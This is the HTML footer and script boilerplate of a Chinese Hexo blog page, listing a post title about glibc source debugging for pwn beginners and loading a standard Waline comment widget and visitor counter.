title="pwn入门-46-glibc源码调试">pwn入门-46-glibc源码调试</a><time datetime="2023-11-06T13:01:36.000Z" title="发表于 2023-11-06 21:01:36">2023-11-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By 唐仔橙</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadWaline () {
+  function insertCSS () {
+    const link = document.createElement("link")
+    link.rel = "stylesheet"
+    link.href = "https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css"
+    document.head.appendChild(link)
+  }
+
+  function initWaline () {
+    const waline = Waline.init(Object.assign({
+      el: '#waline-wrap',
+      serverURL: 'https://comment-5fim5uiat-tangzichengcc.vercel.app',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      path: window.location.pathname,
+      comment: false,
+    }, null))
+  }
+
+  if (typeof Waline === 'function') initWaline()
+  else {
+    insertCSS()
+    getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js').then(initWaline)
+  }
+}
+
+if ('Waline' === 'Waline' || !false) {
+  if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+  else setTimeout(loadWaline, 0)
+} else {
+  function loadOtherComment () {
+    loadWaline()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
